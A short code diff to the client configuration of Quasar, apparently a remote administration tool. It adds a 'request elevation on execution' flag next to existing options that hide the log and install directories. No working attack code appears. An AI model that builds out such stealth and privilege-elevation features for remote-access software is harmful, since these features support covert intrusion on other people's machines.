@@ -32,6 +32,7 @@ namespace Quasar.Client.Config
         public static X509Certificate2 SERVERCERTIFICATE;
         public static bool HIDELOGDIRECTORY = false;
         public static bool HIDEINSTALLSUBDIRECTORY = false;
+        public static bool REQUESTELEVATIONONEXECUTION = false;
 
         public static bool Initialize()
         {
@@ -60,6 +61,7 @@ namespace Quasar.Client.Config
         public static X509Certificate2 SERVERCERTIFICATE;
         public static bool HIDELOGDIRECTORY = false;
         public static bool HIDEINSTALLSUBDIRECTORY = false;
+        public static bool REQUESTELEVATIONONEXECUTION = false;
 
         public static bool Initialize()
         {
